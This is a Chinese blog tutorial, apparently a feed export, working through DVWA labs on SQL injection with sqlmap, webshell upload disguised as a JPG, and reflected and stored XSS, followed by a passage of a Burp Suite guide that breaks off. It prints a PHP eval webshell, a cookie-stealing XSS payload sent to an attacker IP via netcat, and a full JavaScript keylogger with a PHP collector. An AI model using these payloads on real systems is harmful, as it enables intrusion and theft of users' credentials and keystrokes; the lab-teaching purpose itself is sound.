low级别<br>　　<img src="https://s1.ax1x.com/2020/04/22/JNiUNn.png"><br>　　源码可知，创建了一个id变量，将这个变量带入SELECT first_name, last_name FROM users WHERE user_id = ‘$id’中，如果我输入1就是user_id = ‘1’，查询uer_id是1的用户信息<br>　　<img src="https://s1.ax1x.com/2020/04/22/JNixv8.png"><br>　　这只是我合法的提交，如果我提交一个’上去，查询语句就变成user_id=’’’，在sql语句中’号或者”号都是成对出现的如，’’,””，这样所以这会使查询语句报错。当然你可能会问万一有用户id是’呢，所以我们还要多次测试验证确实有sql注入语句。<br>　　第一次提交’<br>　　<img src="https://s1.ax1x.com/2020/04/22/JNkx0g.png"><br>　　出现sql查询语句出错，这样有报错信息的叫sql报错注入，而且可以看到我们只提交了’，报错了near ‘’’’’，很明显就是引号不配对造成的错误。<br>　　第二次提交1’ and 1=1 # ，完整的查询语句就是SELECT first_name, last_name FROM users WHERE user_id = ‘1’ and 1=1 #’<br>　　#在sql语句是注释意思，and or 这是基本的逻辑关系，但凡有点数学逻辑基本能懂1=1这种是真，所以整条逻辑就是真<br>　　<img src="https://s1.ax1x.com/2020/04/22/JNE3Ps.png"><br>　　id就变成了提交信息去了，很明显存在sql注入攻击。提交改为1’ and 1=2 #，提交后无任何回显。因为1=2就是假，又是and整条语句逻辑上就是假，所以就不执行sql语句。<br>　　剩下的就是什么查表，查数据库，查字段，查属性，获取用户名，主机名等等信息，反正sql命令能做的都能做到。本文章不详细说明人工注入，这里上注入神器sqlmap，还是那句话我也不详细说明sqlmap的具体命令。<br>　　这里要说明的是sqlmap只能检测一个url是否存在sql注入，而不是给网站的url如www<span></span>.baidu.com。先提交一个1上去后，复制url。<br>　　<img src="https://s1.ax1x.com/2020/04/22/JNnfC4.png"><br>　　-u 指定一个可疑存在sql注入的url，因为这个dvwa是需要登录的，所以要加上cookie命令，–dbs是查询有哪些数据库。执行后如图所示查询到的数据库<br>　　<img src="https://s1.ax1x.com/2020/04/22/JNuDiD.png"><br>　　查询数据库，表，字段，属性内容如下命令，更多命令请移步<a href="https://www.freebuf.com/sectool/164608.html">超详细SQLMap使用攻略及技巧分享</a></p><pre class="line-numbers language-none"><code class="language-none">-dbs 查看有哪些数据库-D 数据库名 --tables 查看当前数据库有哪些表 -D 数据库名 -T 表名 --columns 查看字段-D 数据库名 -T 表名 --column --dump 查看当前表内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>　　接着继续查询dvwa数据库中有哪些表。<br>　　输入sqlmap -u “http://<span></span>192.168.2.123/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#” –cookie=”PHPSESSID=ef87119a9e058a4616fd5132529eee34;security=low” -D dvwa –tables<br>　　<img src="https://s1.ax1x.com/2020/04/22/JNK7tO.png"><br>　　继续查询users表中有哪些字段，输入sqlmap -u “http://<span></span>192.168.2.123/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#” –cookie=”PHPSESSID=ef87119a9e058a4616fd5132529eee34;security=low” -D dvwa -T users –columns<br>　　<img src="https://s1.ax1x.com/2020/04/22/JNMnEV.png"><br>　　最后只需要查询users表中字段的具体内容就完毕了，输入sqlmap -u “http://<span></span>192.168.2.123/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#” –cookie=”PHPSESSID=ef87119a9e058a4616fd5132529eee34;securitwa -T users –columns –dump，因为从结果中大致判断password是md5加密的，所以中间会弹出询问信息，您是否想通过基于字典的攻击来破解它们？我一般直接输入n=no，然后这玩意随便找个md5在线破解。md5是不可逆的，所以这种攻击叫md5撞库解密。<br>　　<img src="https://s1.ax1x.com/2020/04/22/JNQtMj.png"><br>　　medium级别，还是直接看代码<br>　　<img src="https://s1.ax1x.com/2020/04/22/JN6wi8.png"><br>　　可以看到有一个函数mysql_real_escape_string() ，过滤的字符有\x00、\n、\r、’、”、\x1a<br>　　这就意味这我们只要输入有’就会被过滤掉，但仔细看sql语句是SELECT first_name, last_name FROM users WHERE user_id = $id，少了两个’$id’，所以还减轻了我们的输入量直接提交1 or 1=2也能成功执行<br>　　<img src="https://s1.ax1x.com/2020/04/22/JN4S41.png"><br>　　high级别<br>　　<img src="https://s1.ax1x.com/2020/04/22/JUpdu4.png"><br>　　前面直接也是用函数过滤，然后执行if(is_numeric($id))，判断输入是不是数字，好了没有sql注入了散了散了。。</p><h3 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h3><p>　　sql布尔盲注，返回是布尔类型即逻辑，比如sql整条语句是真，就返回一种结果。是假可能就是宁一种结果。<br>　　这次直接提交’上去后，发现无任何回显结果，然而在报错注入中给出了报错信息。这也是布尔盲注的一种特性，然后提交1’ and 1=1 #<br>　　<img src=".ax1x.com/2020/04/22/JNE3Ps.png)　　整体提交值被">入，后面构造payload就要用ascii()，len()，char()等等函数，太多了这不是本章的重点，直接跳过</p><h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>　　文件上传漏洞，为啥上传个文件都能成漏洞，这个问题提的不错。上传文件功能或多或少一些网站都有，上传照片，文档基本都是个最基本的功能。不过这只是按照常规的方式去思考问题，安全应该大开脑洞，不应该局限自己的思维，试想如果上传一个木马文件上去会怎么样。直接拿到对方服务器权限了啊，所以这就是文件上传漏洞。<br>　　low级别，直接上传一个php一句话木马试试。1.php里面内容为&lt;<span></span>?php @eval($_POST[‘hacker’]); ?&gt;<br>　　<img src="https://s1.ax1x.com/2020/04/22/JUERHS.png"><br>　　看着上面一行英文，请选择一张图片上传，再看看我上传的是php嗯，very good，源码就不看了，因为这部分是我最熟悉的，然而源码却是我最看不懂的部分。。。。<br>　　medium级别，还是直接像刚刚那样上传php<br>　　<img src="https://s1.ax1x.com/2020/04/22/JUVIaD.png"><br>　　文件上传大多数要用抓包工具，还是直接上burp。抓包截断后<br>　　<img src="https://s1.ax1x.com/2020/04/22/JUmeC4.png"><br>　　从包头看到了一个MAX_FILE_SIZE还限制了文件大小为100000具体单位暂时不知，重点关注Content-Type，告诉客户端实际返回的内容的内容类型。<br>　　图中的是Content-Type: application/octet-stream，虽然具体不懂是啥意思，但一看这文件就不是图片，那么是不是可以手动改成图片类型呢，这个问题也问的好，当然可以。这里就介绍mimetype命令。<br>　　场景设想：如果一个文件原本是1.php，我手动改成1.jpg那么本质上来说它却是php文件，从我们肉眼上来说却是jpg。能骗到人，无法骗到我mimetype(txt以及其衍生文件.json等没有文件头，对这几个文件类型无效)。<br>　　先看看php类型的<br>　　<img src="https://s1.ax1x.com/2020/04/22/JUMhpF.png"><br>　　你说欺骗不了我mimetype，我这就试试将后缀名改为jpg格式<br>　　<img src="https://s1.ax1x.com/2020/04/22/JUM701.png"><br>　　此时mimetype笑了，所以利用mimetype命令可以很轻松的查看文件类型，这里查出png格式的类型为image/png。<br>　　回到burp，如下图更改数据<br>　　<img src="https://s1.ax1x.com/2020/04/22/JUlwrj.png"><br>　　发包后出现，上传失败<br>　　<img src="https://s1.ax1x.com/2020/04/22/JUVIaD.png"><br>　　这就很尴尬了，是我操作有毛病吗，后来我尝试真正上传一张png图片的时候，确实不行。直到上传了一张jpg才发现可以。果断将格式改为image/jpeg<br>　　<img src="https://s1.ax1x.com/2020/04/23/JdW0mD.png"><br>　　成功，还是看看源码吧<br>　　<img src="https://s1.ax1x.com/2020/04/23/JdW57Q.png"><br>　　只允许jpg并且要小于100000(我们仍未知道那天所限制的文件大小的单位)<br>　　high级别，既然使用最高级别了，哪就使用杀手锏了吧。一般这种都会有后缀名判断加Content-Type，还有文件内容判断。<br>　　先试试改Content-Type和后缀名<br>　　<img src="https://s1.ax1x.com/2020/04/23/Jd410S.png"><br>　　发现是能直接上传，然后通过菜刀连接也能成功连上<br>　　<img src="https://s1.ax1x.com/2020/04/23/Jd4gpR.png"><br>　　这里必须还要配合文件解析漏洞，所以我们的php即使是jpg格式它还是php马。<br>　　你以为文件上传就这样结束了吗，当然没有，这次将一句话木马放在一个真正的jpg文件中。<br>　　<img src="https://s1.ax1x.com/2020/04/23/JdopSs.png"><br>　　先上传一个真正的jpg文件，然后删除掉图片内容数据只保留前3行即可，插入一句话木马，改后缀名。因为前几行的数据是说明了此文件的类型，mimetype其实就是判断前几行的数据可知此文件的具体类型的。<br>　　<img src="https://s1.ax1x.com/2020/04/23/JdTIKI.png"><br>　　放包后成功上传，文件上传这一块知识点远远不止这点。。<br>　　我遇到一个真实的案例就是不管你上传的是什么后缀名的图片类型，如1.php.jpg 1.php.php.png 啥的反正不管你最后怎么改后缀。最后上传都变成xx.png，这也是防文件上传漏洞的一种方法。</p><h3 id="XSS-reflected"><a href="#XSS-reflected" class="headerlink" title="XSS reflected"></a>XSS reflected</h3><p>　　xss(跨站脚本攻击)，这一块的知识点是JavaScript的利用后面简称js。还是先说说原理，用户在像什么搜索栏，提交栏中输入恶意的js代码，注入进前端代码中，从而触发攻击。<br>　　low级别，emmm，我知道你懵逼，还是看案例，先输入一个hello后，查看burp的请求历史记录<br>　　<img src="https://s1.ax1x.com/2020/04/23/Jdq4Ff.png"><br>　　<img src="https://s1.ax1x.com/2020/04/23/JdqLmn.png"><br>　　hello原封不动的在这对&lt;<span>pre&gt;&lt;</span>/pre&gt;标签中，如果你对js有一定的了解，那么下面一段代码你肯定再熟悉不过了，这次提交框输入&lt;<span>script&gt;alert(‘xss’)&lt;</span>/script&gt;。此语句的意思是弹出一个提醒框，内容为xss，提交后<br>　　<img src="https://s1.ax1x.com/2020/04/23/JdLhu9.png"><br>　　还是看刚刚提交的请求历史包<br>　　<img src="https://s1.ax1x.com/2020/04/23/JdLvDA.png"><br>　　发现它将这段我们提交的内容，当成html里面的语句来执行了，这就是xss，所以js就让我们在网页弹一个这个玩意吗？no，no这只是js语言的冰山一角而已，别小看js，曾经有个大佬用js写了一个操作系统。<br>　　言归正传，在这里先试试重定向页面。poc：&lt;<span>script&gt;window.location=”https://<span>w</span>ww.baidu.com”&lt;</span>/script&gt;,提交后就会跳转到百度。<br>　　获取cookie信息演示，先kali侦听80端口，nc -lvp 80，然后提交&lt;<span>script&gt;new Image().src=”http://<span></span>攻击者ip地址/c.php?output=”+document.cookie;&lt;</span>/script&gt;，如我kali的ip地址是192.168.2.161中间那段攻击者ip地址就是192.168.2.161。提交后。<br>　　<img src="https://s1.ax1x.com/2020/04/23/Jwp5tA.png"><br>　　cookie信息一览无遗。<br>　　最后演示键盘记录器，创建3个文件分别为key.js keylog.txt keylogger.php都放在kali中的/var/www/html<br>　　<img src="https://s1.ax1x.com/2020/04/23/JwiU3R.png"><br>　　key.js<br><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function-variable function">onkeypress</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">evt</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>evt <span class="token operator">=</span> evt <span class="token operator">||</span> window<span class="token punctuation">.</span>event<span class="token punctuation">;</span>key <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>evt<span class="token punctuation">.</span>charCode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> param <span class="token operator">=</span> <span class="token function">encodeURI</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>http<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token string">"http://192.168.2.161/keylogger.php"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>http<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>http<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"key="</span><span class="token operator">+</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>　　keylogger.php<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$logfile</span><span class="token operator">=</span><span class="token double-quoted-string string">"keylog.txt"</span><span class="token punctuation">;</span><span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$logfile</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>　　keylog.txt是用来存储击键内容，然后开启kali的apach服务service apache2 start，先试试访问key.js能成功不<br>　　<img src="https://s1.ax1x.com/2020/04/23/JwP711.png"><br>　　成功访问后，输入框提交&lt;<span>script src=”http://攻击者ip/key.js”&gt;&lt;/script</span>&gt;<br>　　<img src="https://s1.ax1x.com/2020/04/23/JwF1xI.png"><br>　　除了输出一段hello外似乎无任何变化，但是只要你在这个页面上击键比如，随便输入qwer，在查看keylog内容后发现已经被记录，还是那句话这只是js功能的冰山一角。<br>　　<img src="https://s1.ax1x.com/2020/04/23/JwkpOP.png"><br>　　源码也是没啥过滤。补充一下这是反射性xss，刚才演示中可以看到要自己去点击提交后才能触发这些恶意行为，所以反射性xss一般都配合社会工程学，诱导对方去点击存在xss的网页链接，并且如果是要登陆的网页，对方还需要先登陆才行，和上面的csrf过程很像。一旦对方关闭了此网页后，攻击代码立刻失效。<br>　　<img src="https://s1.ax1x.com/2020/04/23/Jwkmyq.png"><br>　　medium级别，先试试大写绕过，poc：&lt;<span>Script&gt;alert(‘xss’)&lt;/script</span>&gt;，成功弹窗。双写绕过，poc：&lt;scr&lt;<span>script&gt;ipt&gt;alert(‘xss’)&lt;/script</span>&gt;，其他html标签只要能加载js就行，poc：&lt;img src=”#” onerror=alert(“xss”)&gt;&lt;<span>/img</span>&gt;。还有非常多的姿势<br>　　源码：只是将&lt;<span>script</span>&gt;过滤掉<br>　　<img src="https://s1.ax1x.com/2020/04/24/JDQIr8.png"><br>　　high级别，下无论你输入什么都会原封不动的返回出来。&lt;<span>script&gt;&lt;/script</span>&gt;它会吧它处理成正常的文本，而不是html标签语法。<br>　　<img src="https://s1.ax1x.com/2020/04/24/JD3rrV.png"><br>　　源码<br>　　<img src="https://s1.ax1x.com/2020/04/24/JD1aX6.png"><br>　　htmlspecialchars函数把预定义的字符转换为 HTML 实体。<br>　　&amp; （和号）成为 &amp;<br>　　“ （双引号）成为 “<br>　　‘ （单引号）成为 ‘<br>　　&lt; （小于）成为 &lt;<br>　　&gt; （大于）成为 &gt;<br>　　在这里不存在xss的情况，仅仅在这里而已，看插入代码的具体位置，这里输入的内容是一对括号之内的。<br>　　<img src="https://s1.ax1x.com/2020/04/24/JD8CdS.png"><br>　　而这个函数不会过滤’单引号，如果代码插入的位置是在如&lt;<span>a href=’你提交的内容’&gt;&lt;/a</span>&gt;，那么构造poc为’ onlick=’alert(xss)，代入进语句就是&lt;<span>a href=’’ onlick=’alert(xss)’&gt;&lt;/a</span>&gt;，这样也能成功执行xss，所以不能一概而论，要看具体的情况而定。</p><h3 id="XSS-stored"><a href="#XSS-stored" class="headerlink" title="XSS stored"></a>XSS stored</h3><p>　　存储型xss，这个意思是将xss注入进服务器中，反射性xss还要诱导对方来点击。而这个存储型xss你只需要睡一觉，等明天看有多少鱼儿上钩就完事。最经常见的例子就是留言板，你提交留言后，每个人都可以看见这条留言。所以你注入恶意js代码后，每个人只要点击查看留言那么它就中招了。<br>　　先正常提交一些数据。<br>　　<img src="https://s1.ax1x.com/2020/04/24/JDaoUP.png"><br>　　测试发现在Name，和message框输入到一定长度的时候就无法输入了。<br>　　<img src="https://s1.ax1x.com/2020/04/24/JDUGSe.png"><br>　　这个时候f12定位到输入框位置，看见一个maxlength=”50”，这个就是限制输入的长度，删除掉即可解除长度限制。<br>　　<img src="https://s1.ax1x.com/2020/04/24/JDUHX9.png"><br>　　之后的攻击步骤都是跟上面的反射性xss都是一样的，提交后，先弹窗xss<br>　　<img src="https://s1.ax1x.com/2020/04/24/JDaEAP.png"><br>　　然后f5刷新页面，发现又会弹窗xss<br>　　<img src="https://s1.ax1x.com/2020/04/24/JDavbn.png"><br>　　点击左边的Setup，然后点击Create/Reset Database可以重置数据库信息，这样就会把我们前面注入的xss信息重置掉。<br>　　<img src="https://s1.ax1x.com/2020/04/24/JDdoL9.png"><br>　　如果换成窃取cookie信息，管理员一点开查看留言板，他的cookie就会被泄露。其他等级就不试了，无非就是绕过姿势。然后如果你又不懂js，而为了学xss又去专门花几个月时间系统学习了一下前端，感觉有点得不偿失。这时候BeEF登场了，它是一款专门配合xss漏洞的攻击框架，就看看界面，详细了解的话本篇不介绍。<br>　　<img src="https://s1.ax1x.com/2020/04/24/JD0EA1.png"><br>　　还有一个忘了说了，xss分三种类型，反射性xss，存储型xss前面都说过，剩下一个是dom型xss。还是前端有关的，dom对象，不了解，不多讲。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>　　对sql命令有多熟悉，就对sql注入有多了解，攻击面有多广。对js有多了解，就对xss攻击程度有多深。<br>　　互联网本来是安全的，自从有了研究安全的人之后，互联网就变得不安全了！</p><div style="text-align: right;">————《白帽子讲Web安全》</div>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite</title>
      <link href="2020/48647.html"/>
      <url>2020/48647.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　　Burp Suite 是一款非常优秀的抓包工具之一，渗透测试必备神器，本章不介绍最最最基本的抓包配置等等，只介绍常用功能。<br><a id="more"></a></p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>　　物理机: 192.168.2.213<br>　　靶　机: 192.168.2.123<br>　　K a l i  : 192.168.2.161</p><h3 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h3><h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><p>　　物理机无法抓靶机流量包，Kali能抓靶机流量包，但告知你必须要用物理机去抓到靶机流量包，怎样办？</p><h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h4><p>　　在Proxy-&gt;Options-&gt;Proxy Listeners-&gt;Add 添加代理侦听<br>　　<img src="https://s1.ax1x.com/2020/04/19/JuwGFg.png"><br>　　设置绑定端口：随便设置 我设置为8080，设置绑定地址：我设置的是全网卡，直接ok选择yes后退出<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJmOe.png"><br>　　不抓本地包，所以去掉第一个选项卡<br>　　配置靶机中浏览器代理为物理机中的ip，端口为刚才设置的8080<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8dL4.png"><br>　　抓包成功,当然强大的burp也能抓手机包,本篇不介绍<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8uQS.png"></p><h4 id="options"><a href="#options" class="headerlink" title="options"></a>options</h4><p>　　只介绍Response Modification功能<br>　　设置用于执行自动响应的修改。可以使用这些选项通过自动重写应用程序响应的HTML来完成各种任务。 下列选项在数据删除客户端控件可能是有用的<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJR0J.png"><br>　　有些网页中是把表单隐藏了的<br>　　Unhide hidden form fields:显示隐藏的表单<br>　　　　Prominently highlight unhidden fields:高亮显示这些字段<br>　　有些表单是禁止输入内容的<br>　　Enable disabled form fields:启用禁用的表单<br>　　比如你输入密码框长度不能超过多少位，这个就可以突破<br>　　Remove input field length limits:移除输入字段长度限制<br>　　比如是否按正确的格式去输入<br>　　Remove JavaScript from validation:从验证中删除JavaScript<br>　　这个具体实际作用在哪里我也不知道<br>　　Remove secure flag from cookies:从cookies中删除安全标志<br>　　secure flag如图所示<br>　　<img src="https://s1.ax1x.com/2020/04/19/Juw2lR.png"></p><h3 id="导出项目"><a href="#导出项目" class="headerlink" title="导出项目"></a>导出项目</h3><p>　　最上面的选项卡Burp-&gt;Save copy of projec<br>　　<img src="https://s1.ax1x.com/2020/04/19/JuwR61.png"><br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJW79.png"><br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJhkR.png"><br>　　再下一步就是选择保存位置和文件名称，点击保存就完成了</p><h3 id="导入项目"><a href="#导入项目" class="headerlink" title="导入项目"></a>导入项目</h3><p>　　写的够详细了，就不介绍了<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8heH.png"></p><h3 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h3><h4 id="site-map"><a href="#site-map" class="headerlink" title="site map"></a>site map</h4><p>　　当你抓取到了流量包后,会在target模块中生成站点地图,它采用树状的层次结构显示信息。<br>　　站点又分为两类:黑色和灰色<br>　　黑色:浏览器真正的对一个url发起了请求,服务器对它返回了响应信息<br>　　灰色:从页面中的url爬网爬出来的,并没有对该url的资源发生真正的访问一次。<br><img src="https://s1.ax1x.com/2020/04/18/JnJ9eJ.png"></p><table><thead><tr><th style="text-align:center">内容区域</th><th style="text-align:center">信息描述</th></tr></thead><tbody><tr><td style="text-align:center">左边</td><td style="text-align:center">站点层次目录</td></tr><tr><td style="text-align:center">中上</td><td style="text-align:center">此站点具体请求流量包历史</td></tr><tr><td style="text-align:center">中下</td><td style="text-align:center">此流量包具体数据内容(请求包,响应包)</td></tr><tr><td style="text-align:center">右上</td><td style="text-align:center">安全提示</td></tr><tr><td style="text-align:center">右下</td><td style="text-align:center">安全建议</td></tr></tbody></table><h4 id="scope"><a href="#scope" class="headerlink" title="scope"></a>scope</h4><p>　　查看当前站点过滤信息，当你想只查看某一个站点信息或者某个目录的时候，如下图所示选择要显示的站点，发送到scope去。<br>　　<img src="https://s1.ax1x.com/2020/04/19/Juw3TS.png"><br>　　Include in scope:只查看当前列表中的站点信息=白名单<br>　　Exclude from scope:排除掉列表中的站点信息=黑名单<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJawj.png"></p><h4 id="site-map-filter"><a href="#site-map-filter" class="headerlink" title="site map filter"></a>site map filter</h4><p>　　单击filter哪一栏,会弹出过滤器规则,当你勾选好过滤规则后,只需要点击其他空白处,就会自动开始过滤<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJueH.png"><br>　　Show only in-scope items:仅显示范围内的站点(此处需搭配scope使用) 勾选后入图所示<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJtOg.png"><br>　　Show only requested items:仅显示真正发起请求的站点<br>　　Show only parameterizend requests:仅显示参数化的请求 也就是 过滤掉html,htm这类站点<br>　　Filter by search term:按关键词筛选 比如我只看url地址中包含了dvwa关键字<br>　　<img src="https://s1.ax1x.com/2020/04/19/Juwx78.png"><br>　　结果入图所示<br>　　<img src="https://s1.ax1x.com/2020/04/19/Juwv0f.png"><br>　　Filter by MIME type:按文件类型筛选<br>　　Filter by status code:按状态码筛选<br>　　Filter by file extension:按文件扩展名筛选<br>　　　　show only:展示asp,aspx,jsp,php等扩展名<br>　　　　Hide:不展示js,gif,jpg,png,css等扩展名<br>　　Filter by annotation:<br>　　　　Show only commented items:仅显示注释的项目<br>　　　　给url添加注释<br>　　　　<img src="https://s1.ax1x.com/2020/04/19/JuwJYQ.png"><br>　　　　添加完注释后<br>　　　　<img src="https://s1.ax1x.com/2020/04/19/Juw40K.png"><br>　　　　Show only highlighted items:仅显示高亮的项目<br>　　　　点击host进行高亮设置<br>　　　　<img src="https://s1.ax1x.com/2020/04/19/Ju8WOe.png"><br>　　当你选乱的情况下,在Filter下面show all;hide all那一栏点击Revert changes:还原更改</p><h3 id="Spider"><a href="#Spider" class="headerlink" title="Spider"></a>Spider</h3><p>　　它提供爬虫功能，帮助来爬取网站目录结构<br>　　右键选择要爬取的主机或者分支发送到spider，它就会自动开始爬取网站<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJCw9.png"><br>　　如果遇到需要验证的表单，burp会自动弹出，知道就填上，提交选Submit form，忽略选Ignore form<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJPoR.png"></p><h4 id="control"><a href="#control" class="headerlink" title="control"></a>control</h4><p>　　在Spider-&gt;Control可以看见爬取的状态<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJ3fP.png"><br>　　Requests made:已经发送的请求<br>　　Bytes transferred:传输字节<br>　　Requests queued:请求的队列数量<br>　　Forms queued:正在排队的表单数量<br>　　点击Spider is running 后，暂停爬取，再次点击继续爬取<br>　　Clear queues:清除队列</p><h4 id="options-1"><a href="#options-1" class="headerlink" title="options"></a>options</h4><p>　　Spider-&gt;Options-&gt;Application Login 到申请登陆功能这里查看<br>　　默认选择Prompt for guidance即需要身份验证的时候就提示<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJFF1.png"><br>　　Don’t submit login forms:不要进行表单提交身份验证<br>　　Handle as ordinary forms:普通形式处理<br>　　Automatically submit these credentials:自动提交这些凭据 勾选后 它将自动将username和password里面的数据提交进表单<br>　　其他功能默认就行</p><h3 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h3><p>　　在进行scanner(漏洞扫描)前，先使用spider功能，这样可以最大限度发现漏洞<br>　　右键选择分支或者主机，选择主动扫描，没有搞懂被动扫描有什么用<br>　　<img src="https://s1.ax1x.com/2020/04/19/JuwYWj.png"><br>　　这时会弹出主动扫描向导<br>　　<img src="https://s1.ax1x.com/2020/04/19/JuwNSs.png"><br>　　最后一个选项Remove items with the follwing extensions:以下扩展名的不扫描。没必要扫这些勾选上<br>　　直接Next-&gt;Ok就开始进行扫描</p><h4 id="Scan-queue"><a href="#Scan-queue" class="headerlink" title="Scan queue"></a>Scan queue</h4><p>　　此处查看扫描队列的详细进度<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJ0kn.png"><br>　　Issues颜色级别<br>　　High:红色    Medium:橙色    Low:黄色    Information:深灰色</p><h4 id="Issue-activity"><a href="#Issue-activity" class="headerlink" title="Issue activity"></a>Issue activity</h4><p>　　此功能是查看具体安全报告信息<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJ5fx.png"><br>　　上面一部分</p><table><thead><tr><th style="text-align:center">Action</th><th style="text-align:center">Issue type</th><th style="text-align:center">Host</th><th style="text-align:center">Path</th><th style="text-align:center">Insertion point</th><th style="text-align:center">Severtity</th><th style="text-align:center">Confidence</th></tr></thead><tbody><tr><td style="text-align:center">行为</td><td style="text-align:center">问题类型</td><td style="text-align:center">主机</td><td style="text-align:center">路径</td><td style="text-align:center">插入点</td><td style="text-align:center">严重程度</td><td style="text-align:center">确信程度  </td></tr></tbody></table><p>　　Confidence(信任度由高到低):  Certain&gt;Firm &gt;Tentative<br>　　下面一部分<br>　　给出漏洞修补建议,即漏洞细节和漏洞背景,还有一如既往的请求包和响应包</p><h4 id="options-2"><a href="#options-2" class="headerlink" title="options"></a>options</h4><h5 id="Attack-Insertion-Points"><a href="#Attack-Insertion-Points" class="headerlink" title="Attack Insertion Points"></a>Attack Insertion Points</h5><p>　　change parameter locatons:更改参数的位置<br>　　这些都勾选上，比如url里面的内容放到cookie，逐一检查<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJ2m4.png"><br>　　第二个划红线的意思是发现隐蔽的命令注入点，如url中的base64编码，解码后发现是xml的值或者json，ajax等客户端对象存储的数据</p><h5 id="Active-Scanning-Engine"><a href="#Active-Scanning-Engine" class="headerlink" title="Active Scanning Engine"></a>Active Scanning Engine</h5><p>　　<img src="https://s1.ax1x.com/2020/04/18/JnJop6.png"></p><h5 id="Active-Scanning-Optimization"><a href="#Active-Scanning-Optimization" class="headerlink" title="Active Scanning Optimization"></a>Active Scanning Optimization</h5><p>　　<img src="https://s1.ax1x.com/2020/04/18/JnJdTs.png"><br>　　Scan speed:扫描速度<br>　　扫描仔细度:Thorough &gt; Normal &gt; Fast<br>　　Normal:正常速度    Fast:快    Thorough:彻底扫描<br>　　Scan accuracy:扫描精度<br>　　Normal:正常精度    Minimize false negatives:最小漏判(追求扫描最多漏洞数量时选择)    Minimize false positives:最小误报(追求扫描结果准确性时选择)</p><h3 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h3><p>　　Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 